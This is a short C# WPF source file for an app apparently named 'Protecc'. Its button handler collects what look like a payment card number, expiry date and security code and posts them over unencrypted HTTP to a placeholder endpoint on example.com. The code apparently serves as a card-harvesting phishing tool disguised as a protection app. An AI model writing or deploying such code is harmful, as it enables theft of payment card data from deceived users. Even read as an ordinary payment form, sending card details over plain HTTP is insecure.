using System;
using System.Collections.Generic;
using System.Linq;
using System.Net.Http;
using System.Text;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Data;
using System.Windows.Documents;
using System.Windows.Input;
using System.Windows.Media;
using System.Windows.Media.Imaging;
using System.Windows.Navigation;
using System.Windows.Shapes;

namespace Protecc {
    /// <summary>
    /// Interaction logic for MainWindow.xaml
    /// </summary>
    public partial class MainWindow : Window {
        public static string url = "http://example.com/post.php";
        public static HttpClient client = new HttpClient();

        public MainWindow() {
            InitializeComponent();
        }

        private async void Button_Click(object sender, RoutedEventArgs e) {
            if (Form_Nr.Text == null || Form_Date.Text == null || Form_Code.Text == null) return;
            if (Form_Nr.Text.Length < 16 || Form_Date.Text.Length < 4 || Form_Code.Text.Length < 3) return;

            Dictionary<string, string> payload = new Dictionary<string, string>() {
                { "number", Form_Nr.Text },
                { "date", Form_Date.Text },
                { "code", Form_Code.Text }
            };

            var content = new FormUrlEncodedContent(payload);
            var response = await client.PostAsync(url, content);
        }
    }
}
